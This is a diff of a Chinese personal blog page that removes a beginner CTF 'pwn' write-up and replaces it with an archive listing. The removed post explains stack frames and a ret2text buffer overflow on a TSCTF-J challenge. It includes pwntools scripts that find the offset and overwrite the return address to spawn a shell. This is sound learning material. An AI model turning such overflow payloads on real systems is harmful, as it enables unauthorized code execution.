@@ -20,40 +20,24 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"foundation","dark":"foundation"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="函数调用过程 call func&#x3D;push eip,jmp push ebp mov ebp,esp sub esp,0x20… leave &#x3D; mov esp,ebp;pop ebp ret &#x3D; pop eip  push,pop指令小结">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习记录（其一）">
-<meta property="og:url" content="http://example.com/posts/e04c41db/">
+    <meta name="description" content="记录学习日常">
+<meta property="og:type" content="website">
+<meta property="og:title" content="qsc">
+<meta property="og:url" content="http://example.com/archives/2025/12/">
 <meta property="og:site_name" content="qsc">
-<meta property="og:description" content="函数调用过程 call func&#x3D;push eip,jmp push ebp mov ebp,esp sub esp,0x20… leave &#x3D; mov esp,ebp;pop ebp ret &#x3D; pop eip  push,pop指令小结">
+<meta property="og:description" content="记录学习日常">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/pwn1/checksec.png">
-<meta property="og:image" content="http://example.com/images/pwn1/cyc1.png">
-<meta property="og:image" content="http://example.com/images/pwn1/cyc2.png">
-<meta property="og:image" content="http://example.com/images/pwn1/total.png">
-<meta property="og:image" content="http://example.com/images/pwn1/main.png">
-<meta property="og:image" content="http://example.com/images/pwn1/vuln.png">
-<meta property="og:image" content="http://example.com/images/pwn1/backdoor.png">
-<meta property="og:image" content="http://example.com/images/pwn1/stack.png">
-<meta property="og:image" content="http://example.com/images/pwn1/backdoor_addr.png">
-<meta property="og:image" content="http://example.com/images/pwn1/fail.png">
-<meta property="og:image" content="http://example.com/images/pwn1/success.png">
-<meta property="article:published_time" content="2025-11-01T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-03T11:21:27.202Z">
 <meta property="article:author" content="qsc">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/pwn1/checksec.png">
 
 
-<link rel="canonical" href="http://example.com/posts/e04c41db/">
+<link rel="canonical" href="http://example.com/archives/2025/12/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/posts/e04c41db/","path":"posts/e04c41db/","title":"pwn学习记录（其一）"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"archives/2025/12/index.html","title":""}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>pwn学习记录（其一） | qsc</title>
+<title>归档 | qsc</title>
   
 
 
@@ -106,7 +90,7 @@
 
     <a href="/" class="brand" rel="start">
       <i class="logo-line"></i>
-      <p class="site-title">qsc</p>
+      <h1 class="site-title">qsc</h1>
       <i class="logo-line"></i>
     </a>
       <p class="site-subtitle" itemprop="description">早上好中午好下午好晚上好 </p>
@@ -160,7 +144,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -173,7 +157,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">函数调用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#push-pop%E6%8C%87%E4%BB%A4%E5%B0%8F%E7%BB%93"><span class="nav-number">1.1.</span> <span class="nav-text">push,pop指令小结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#push"><span class="nav-number">1.1.1.</span> <span class="nav-text">push</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-number">1.1.2.</span> <span class="nav-text">pop</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text%E5%9F%BA%E7%A1%80%E5%85%B6%E4%B8%80-%E4%BB%A5TSCTF-J-ret%E9%A2%98%E4%B8%BA%E4%BE%8B"><span class="nav-number">2.</span> <span class="nav-text">ret2text基础其一(以TSCTF-J ret题为例)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">常见溢出函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">2.2.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cyclic"><span class="nav-number">2.3.</span> <span class="nav-text">cyclic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret"><span class="nav-number">2.4.</span> <span class="nav-text">ret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%98%E6%96%B9wp"><span class="nav-number">2.5.</span> <span class="nav-text">官方wp</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -227,210 +210,49 @@
 
     </div>
 
-    <div class="main-inner post posts-expand">
+    <div class="main-inner archive posts-collapse">
 
 
   
-
-
-<div class="post-block">
   
   
+  <div class="post-block">
+    <div class="post-content">
+      <div class="collection-title">
+        <span class="collection-header">嗯..! 目前共计 12 篇日志。 继续努力。</span>
+      </div>
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/e04c41db/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/qsc.jpg">
-      <meta itemprop="name" content="qsc">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="qsc">
-      <meta itemprop="description" content="记录学习日常">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="pwn学习记录（其一） | qsc">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          pwn学习记录（其一）
-        </h1>
-
-        <div class="post-meta-container">
-
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-11-02 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-02T00:00:00+08:00">2025-11-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-11-03 19:21:27" itemprop="dateModified" datetime="2025-11-03T19:21:27+08:00">2025-11-03</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span id="busuanzi_value_page_pv"></span>
-    </span>
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.7k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody"><h1 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h1><ol>
-<li>call func&#x3D;push eip,jmp</li>
-<li>push ebp</li>
-<li>mov ebp,esp</li>
-<li>sub esp,0x20<br>…</li>
-<li>leave &#x3D; mov esp,ebp;pop ebp</li>
-<li>ret &#x3D; pop eip</li>
-</ol>
-<h2 id="push-pop指令小结"><a href="#push-pop指令小结" class="headerlink" title="push,pop指令小结"></a>push,pop指令小结</h2><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>执行push ax指令时，相当于将指针减小，再将ax中的内容放入指针所指的内存单元处，指针指向新栈顶</p>
-<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>执行pop ax指令时，相当于将指针所指的内容放入ax处，再将指针增大，指针指向新栈顶</p>
-<hr>
-<h1 id="ret2text基础其一-以TSCTF-J-ret题为例"><a href="#ret2text基础其一-以TSCTF-J-ret题为例" class="headerlink" title="ret2text基础其一(以TSCTF-J ret题为例)"></a>ret2text基础其一(以TSCTF-J ret题为例)</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>由于程序使用了gets，strcpy等易溢出函数，导致读取的数据溢出，覆盖栈上的返回地址和控制参数，使指针跳转到想要的func地址位置。</p>
-<h3 id="常见溢出函数"><a href="#常见溢出函数" class="headerlink" title="常见溢出函数"></a>常见溢出函数</h3><p>gets；scanf；strcpy；sprintf：memcpy；strcat……</p>
-<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>checksec函数可以用来查看程序开了什么保护措施<br><img src="/images/pwn1/checksec.png" alt="checksec 返回结果" title="返回结果"><br>No canary found即意味可以利用栈溢出来获得shell</p>
-<h2 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h2><p>通过cyclic生成指定长度的字符串，注入字符串，可以知道栈的大小<br><img src="/images/pwn1/cyc1.png" alt="cyclic 示意" title="示例"><br><img src="/images/pwn1/cyc2.png" alt="cyclic 示意" title="示例"><br>如图，在注入16个字符时程序并没有报错，而注入24个字符时程序报错，说明想要使栈溢出，至少要注入24个字符<br>或是构建脚本</p>
-<pre><code>from pwn import *
-context.log_level = &#39;debug&#39;
-# 生成测试pattern
-io = process(&#39;./pwn&#39;)
-pattern = cyclic(100)
-io.sendlineafter(b&#39;Just a simple sign-in!&#39;, pattern)
-io.wait()
-# 分析崩溃地址
-core = io.corefile
-rip = core.rip
-print(f&quot;崩溃地址: &#123;hex(rip)&#125;&quot;)
-# 计算偏移量
-offset = cyclic_find(rip &amp; 0xffffffffffff)
-print(f&quot;精确偏移量: &#123;offset&#125;&quot;)
-</code></pre>
-<h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>在ida中打开程序，注意到main函数，vuln函数，和backdoor函数，一个是主函数，另一个是可以利用的漏洞，而最后一个和打通这个程序息息相关<br><img src="/images/pwn1/total.png" alt="total" title="total"><br><img src="/images/pwn1/main.png" alt="main" title="main"><br><img src="/images/pwn1/vuln.png" alt="vuln" title="vuln"><br><img src="/images/pwn1/backdoor.png" alt="backdoor" title="backdoor"></p>
-<p>不仅可以通过cyclic查看溢出需要的字节数，也可以通过ida查看计算<br><img src="/images/pwn1/stack.png" alt="stack" title="stack"><br>如图vuln占据了8+10&#x3D;18个字节，而rbp本身还占8个字节，因此需要24个字节，计算结果与cyclic结果相同</p>
-<p>接下来找到backdoor地址来跳转（0x400676）<br><img src="/images/pwn1/backdoor_addr.png" alt="backdoor" title="backdoor"><br>接下来构建payload&#x3D;b’a’*24+p64(0X4006760)</p>
-<pre><code>io=process(&#39;./pwn&#39;)
-io.recvuntil(&#39;Welcome to TSCTF-J2025!\nJust a simple sign-in!\n&#39;)
-payload=b&#39;a&#39;*24+p64(0x400676)
-io.send(payload)
-io.interactive()
-</code></pre>
-<p>提交后发现无法成功<br><img src="/images/pwn1/fail.png" alt="wrongpayload" title="wrong"><br>这是因为还需要栈对齐（这与本地的操作系统有一定关系）<br>详细可查看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/611961995" title="CTFer成长日记12：栈对齐—获取shell前的临门一脚">栈对齐</a></p>
-<p>在payload中加上p64(ret)<br><img src="/images/pwn1/success.png" alt="success" title="success"><br>输入命令ls后列出目录，说明已经获得权限</p>
-<h2 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h2><p>以上是做题时的想法，接下来展示官方给出的做法</p>
-<pre><code>io=process(&#39;./pwn&#39;)
-io.recvuntil(&#39;Welcome to TSCTF-J2025!\nJust a simple sign-in!\n&#39;)
-payload=b&#39;a&#39;*24+p64(0x40067a)
-io.send(payload)
-io.interactive()    
-</code></pre>
-<p>0x40067a 所对应的汇编代码为<code>mov edi, offset command ; &quot;/bin/sh&quot;</code>类似于直接执行system，跳过了前面的<code>push rbp</code>，也就不用栈对齐,更加简洁，也可能更加不稳定(?)，但值得借鉴</p>
-
+      
+    <div class="collection-year">
+      <span class="collection-header">2025<span class="collection-year-count">12</span></span>
     </div>
 
-    
-    
-    
+  <article itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+      <div class="post-meta-container">
+        <time itemprop="dateCreated"
+              datetime="2025-12-06T00:00:00+08:00"
+              content="2025-12-06">
+          12-06
+        </time>
+      </div>
 
-    <footer class="post-footer"><!-- 只有在文章页面 (is_post) 才加载评论，归档页不加载 -->
+      <div class="post-title">
+          <a class="post-title-link" href="/posts/e04c41db/" itemprop="url">
+            <span itemprop="name">pwn学习记录（其一）</span>
+          </a>
+      </div>
 
-  <div class="arknights-comments-container">
-    <!-- 这里的标题模仿罗德岛终端风格 -->
-    <div class="ak-comment-header">
-      <span class="ak-comment-title">COMMUNICATION_LOG</span>
-      <span class="ak-comment-decoration">// OPEN CHANNEL</span>
-    </div>
-
-    <!-- 粘贴 GISCUS 生成的代码 START -->
-    <script src="https://giscus.app/client.js"
-        data-repo="Qs-C/Qs-C.github.io"
-        data-repo-id="R_kgDOQKri3w"
-        data-category="Announcements"
-        data-category-id="DIC_kwDOQKri384CzWLD"
-        data-mapping="pathname"
-        data-strict="0"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="bottom"
-        data-theme="transparent_dark"
-        data-lang="zh-CN"
-        crossorigin="anonymous"
-        async>
-</script>
-    <!-- 粘贴 GISCUS 生成的代码 END -->
-  
-  </div>
-
-
-          <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-          </div>
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/posts/34711169/" rel="prev" title="二分图匹配">
-                  <i class="fa fa-angle-left"></i> 二分图匹配
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/posts/d05aad03/" rel="next" title="pwn学习记录（其二）">
-                  pwn学习记录（其二） <i class="fa fa-angle-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
+      
+    </header>
   </article>
-</div>
 
 
-
-
-
+    </div>
+  </div>
+  
+  
+  
 
 </div>
   </main>
